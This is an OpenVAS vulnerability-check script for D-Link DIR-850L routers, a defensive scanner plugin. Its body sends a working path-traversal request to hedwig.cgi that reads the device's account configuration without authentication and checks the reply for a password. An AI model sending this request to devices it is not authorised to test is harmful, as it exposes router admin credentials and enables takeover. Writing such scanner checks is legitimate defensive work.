##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dlink_dir_850_mult_vuln.nasl 12439 2018-11-20 13:01:33Z cfischer $
#
# D-Link DIR-850L Multiple Vulnerabilities
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140304");
  script_version("$Revision: 12439 $");
  script_tag(name:"last_modification", value:"$Date: 2018-11-20 14:01:33 +0100 (Tue, 20 Nov 2018) $");
  script_tag(name:"creation_date", value:"2017-08-16 16:49:52 +0700 (Wed, 16 Aug 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("D-Link DIR-850L Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_dlink_dsl_detect.nasl", "gb_dlink_dap_detect.nasl", "gb_dlink_dir_detect.nasl", "gb_dlink_dwr_detect.nasl");
  script_mandatory_keys("Host/is_dlink_device"); # nb: Experiences in the past have shown that various different devices could be affected

  script_xref(name:"URL", value:"https://blogs.securiteam.com/index.php/archives/3364");
  script_xref(name:"URL", value:"http://blog.netlab.360.com/iot_reaper-a-rappid-spreading-new-iot-botnet-en/");

  script_tag(name:"summary", value:"D-Link DIR 850L is prone to multiple vulnerabilities.

  This vulnerability was known to be exploited by the IoT Botnet 'Reaper' in 2017.");

  script_tag(name:"vuldetect", value:"Checks if a vulnerable version is present on the target host.");

  script_tag(name:"insight", value:"D-Link DIR 850L is prone to multiple vulnerabilities:

  - Remote Command Execution via WAN and LAN

  - Remote Unauthenticated Information Disclosure via WAN and LAN

  - Unauthorized Remote Code Execution as root via LAN");

  script_tag(name:"solution", value:"Update to version 1.14B07 BETA or later.");

  script_tag(name:"affected", value:"DIR-850L.

  Other devices and models might be affected as well.");

  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

CPE_PREFIX = "cpe:/o:d-link";

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!infos = get_app_port_from_cpe_prefix(cpe: CPE_PREFIX, service: "www", first_cpe_only: TRUE))
  exit(0);

port = infos["port"];
CPE = infos["cpe"];

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/hedwig.cgi";

data = '<?xml version="1.0" encoding="utf-8"?>\n' +
       '<postxml>\n' +
       '<module>\n' +
       '<service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>\n' +
       '</module>\n' +
       '</postxml>';
cookie = "uid=vt-test";

req = http_post_req(port: port, url: url, data: data, add_headers: make_array("Cookie", cookie,
                                                                              "Content-Type", "text/xml"));
res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

if (res && egrep(pattern: "<result>OK</result>", string: res) &&
    egrep(pattern: "<password>.*</password>", string: res)) {
  report = "It was possible to access the configuration without authenticating which contains sensitive information.\n\nResponse:\n\n" + res;
  security_message(port: port, data: report);
}

exit(0);